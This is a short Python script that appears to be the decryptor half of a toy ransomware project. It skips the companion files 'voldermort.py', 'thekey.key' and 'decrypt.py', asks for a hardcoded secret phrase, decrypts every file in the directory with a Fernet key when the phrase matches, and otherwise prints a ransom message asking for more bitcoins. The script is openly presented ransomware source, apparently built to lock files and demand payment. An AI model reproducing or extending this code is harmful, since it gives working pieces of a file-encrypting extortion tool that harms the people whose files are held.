
import os # for importing all the files through built in library
from cryptography.fernet import Fernet   # built in function for generating key

files = [] # to gather all the files in the directory

for file in os.listdir():
 # to list up all the files present in the current directory
	if file == "voldermort.py" or file== "thekey.key" or file=="decrypt.py":
# leaving the file voldermort behind in the list itself and key file
		continue
	if os.path.isfile(file):
# checking if it's a directory then leaving it behind and gathering   rest
		files.append(file )

print(files)
#printing all the files present in the directory

with open("thekey.key","rb") as key:
	secretkey = key.read()
#reading key as "secretkey"


secretphrase = "coffee"

user_phrase = input("Enter the secret phrase to decrypt your files\n")

if user_phrase == secretphrase:
	for file in files:
	#this "for" loop will open every file then read all the contents in it
	#then write the file back with encrypted data
		with open(file,"rb") as thefile:
			contents = thefile.read()
	#reading the files and saving the content of that files in "contents"
		contents_decrypted = Fernet(secretkey).decrypt(contents)
	#decrypting data from files and saving it in "contents_decrypted"
		with open(file,"wb") as  thefile:
			thefile.write(contents_decrypted)
	#writing decrypted data back into the file
	print("Congrats!! your files are decrypted.\nEnjoy your day")
else:
	print("Sorry,wrong secret phrase.\n Send me more bitcons")
